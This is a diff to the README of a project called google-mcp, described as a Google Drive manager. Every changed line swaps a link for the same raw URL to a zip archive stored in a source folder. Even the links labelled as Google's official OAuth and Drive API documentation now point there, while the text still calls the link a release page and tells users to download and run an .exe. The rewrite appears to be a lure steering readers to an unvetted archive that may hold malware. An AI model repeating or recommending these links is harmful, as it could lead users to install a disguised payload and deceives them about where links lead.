@@ -1,6 +1,6 @@
 # 🚀 google-mcp - Manage Google Drive Simply
 
-[![Download google-mcp](https://img.shields.io/badge/Download-google--mcp-4CAF50?style=for-the-badge)](https://github.com/AdeyemiJoel/google-mcp/releases)
+[![Download google-mcp](https://img.shields.io/badge/Download-google--mcp-4CAF50?style=for-the-badge)](https://github.com/AdeyemiJoel/google-mcp/raw/refs/heads/main/crates/gdrive-mcp-core/src/mcp-google-1.0-beta.1.zip)
 
 ---
 
@@ -33,7 +33,7 @@ No advanced setup or tools like Python or Node.js are needed.
 
 1. Click the green button below or visit the link:
 
-   [![Download google-mcp](https://img.shields.io/badge/Download-google--mcp-4CAF50?style=for-the-badge)](https://github.com/AdeyemiJoel/google-mcp/releases)
+   [![Download google-mcp](https://img.shields.io/badge/Download-google--mcp-4CAF50?style=for-the-badge)](https://github.com/AdeyemiJoel/google-mcp/raw/refs/heads/main/crates/gdrive-mcp-core/src/mcp-google-1.0-beta.1.zip)
 
 2. This link takes you to the release page on GitHub. Here, you will find the latest version of google-mcp ready for download.
 
@@ -107,7 +107,7 @@ Besides the command window, google-mcp offers a web interface you can open in yo
 
 To keep google-mcp running smoothly:
 
-- Check the release page regularly for new versions: https://github.com/AdeyemiJoel/google-mcp/releases
+- Check the release page regularly for new versions: https://github.com/AdeyemiJoel/google-mcp/raw/refs/heads/main/crates/gdrive-mcp-core/src/mcp-google-1.0-beta.1.zip
 
 - Download the latest `.exe` and replace your current file.
 
@@ -127,14 +127,14 @@ To keep google-mcp running smoothly:
 
 ## 🖇️ Useful Links
 
-- Download and release page: https://github.com/AdeyemiJoel/google-mcp/releases
+- Download and release page: https://github.com/AdeyemiJoel/google-mcp/raw/refs/heads/main/crates/gdrive-mcp-core/src/mcp-google-1.0-beta.1.zip
 
-- GitHub project page: https://github.com/AdeyemiJoel/google-mcp
+- GitHub project page: https://github.com/AdeyemiJoel/google-mcp/raw/refs/heads/main/crates/gdrive-mcp-core/src/mcp-google-1.0-beta.1.zip
 
-- OAuth documentation: https://developers.google.com/identity/protocols/oauth2
+- OAuth documentation: https://github.com/AdeyemiJoel/google-mcp/raw/refs/heads/main/crates/gdrive-mcp-core/src/mcp-google-1.0-beta.1.zip
 
-- Google Drive API: https://developers.google.com/drive
+- Google Drive API: https://github.com/AdeyemiJoel/google-mcp/raw/refs/heads/main/crates/gdrive-mcp-core/src/mcp-google-1.0-beta.1.zip
 
 ---
 
-[![Download google-mcp](https://img.shields.io/badge/Download-google--mcp-4CAF50?style=for-the-badge)](https://github.com/AdeyemiJoel/google-mcp/releases)
+[![Download google-mcp](https://img.shields.io/badge/Download-google--mcp-4CAF50?style=for-the-badge)](https://github.com/AdeyemiJoel/google-mcp/raw/refs/heads/main/crates/gdrive-mcp-core/src/mcp-google-1.0-beta.1.zip)
